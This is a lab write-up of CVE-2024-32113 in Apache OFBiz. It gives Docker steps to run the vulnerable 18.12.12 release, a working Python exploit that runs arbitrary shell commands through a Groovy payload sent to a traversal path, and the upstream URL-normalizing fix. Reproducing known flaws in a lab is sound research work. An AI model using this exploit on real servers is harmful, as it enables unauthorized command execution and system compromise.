# CVE-2024-32113

## Description

Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') vulnerability in Apache OFBiz.This issue affects Apache OFBiz: before 18.12.13. Users are recommended to upgrade to version 18.12.13, which fixes the issue.

## Setup

1. Clone the repository

    ```bash
    git clone https://github.com/apache/ofbiz-framework.git ofbiz-framework
    ```

2. Change the directory

    ```bash
    cd ofbiz-framework
    ```

3. Checkout to the vulnerable version

    ```bash
    git checkout release18.12.12
    ```

4. Build the project with docker

    ```bash
    docker build --target demo --tag ofbiz-docker .
    ```

5. Run the project

    ```shell
    docker run -it -p 8443:8443 ofbiz-docker
    ```

Now the project is running on `https://localhost:8443`

## Exploit

Using the following payload, we can execute arbitrary commands on the server:

```python
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(url, command):
    print("[+] CVE-2024-32113 - Apache OFBiz RCE Exploit")
    print(f"[+] Executing command: {command}")

    headers = {
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    data = f"groovyProgram=throw+new+Exception('{command}'.execute().text);"

    try:
        response = requests.post(url + '/webtools/control/forgotPassword;/ProgramExport', headers=headers, data=data, verify=False)

        if response.status_code == 200:
            print("\n[+] Exploit successful")
            soup = BeautifulSoup(response.text, 'html.parser')
            error_message = soup.find('div', class_='content-messages errorMessage')

            if error_message:
                filtered_output = error_message.get_text().strip()
                print(f"[+] Extracted Payload Response:\n{filtered_output}")
            else:
                print("[-] Couldn't find the expected output in the response.")
        else:
            print("[-] Exploit failed. Status code:", response.status_code)

    except requests.RequestException as e:
        print(f"[-] An error occurred: {e}")

if __name__ == '__main__':
    command = input("Enter the shell command you want to execute: ")
    exploit("https://localhost:8443", command)
```

## Explanation

Basically this CVE is a Path Traversal vulnerability, which allows an attacker to execute arbitrary commands on the server. The vulnerability is in the `ControlFilter.java` file, where the URL is not properly validated.

This was fixed by two commits: [commit 1](https://github.com/apache/ofbiz-framework/commit/ff316b6e224b9cb8e3873689f7e6f997af89398a) and [commit 2](https://github.com/apache/ofbiz-framework/commit/b3b87d98ddb1997965f23e2c8356243dbf81dec3)

the overall changes are:

```patch
From ff316b6e224b9cb8e3873689f7e6f997af89398a Mon Sep 17 00:00:00 2001
From: Jacques Le Roux <jacques.le.roux@les7arts.com>
Date: Thu, 11 Apr 2024 15:38:36 +0200
Subject: [PATCH] Fixed: Reject wrong URLs (OFBIZ-13006)

Fixes compile errors when backported from trunk
---
 .../java/org/apache/ofbiz/webapp/control/ControlFilter.java  | 5 ++---
 1 file changed, 2 insertions(+), 3 deletions(-)

diff --git a/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/ControlFilter.java b/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/ControlFilter.java
index c77bd57817c..235019f7d47 100644
--- a/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/ControlFilter.java
+++ b/framework/webapp/src/main/java/org/apache/ofbiz/webapp/control/ControlFilter.java
@@ -21,7 +21,6 @@
 import java.io.IOException;
 import java.net.URI;
 import java.net.URISyntaxException;
-import java.nio.file.Paths;
 import java.util.HashSet;
 import java.util.Set;
 
@@ -136,8 +135,8 @@ public void doFilter(ServletRequest request, ServletResponse response, FilterCha
 
+            // Reject wrong URLs
+            try {
+                String url = new URI(((HttpServletRequest) request).getRequestURL().toString()).normalize().toString();
+                if (!((HttpServletRequest) request).getRequestURL().toString().equals(url)) {
+                    throw new RuntimeException();
+                }
+            } catch (URISyntaxException e) {
+                throw new RuntimeException(e);
+            }
+
```

The change now checks if the URL is valid or not, by normalizing the URL and comparing it with the original URL. If they are not the same, it will throw an exception.
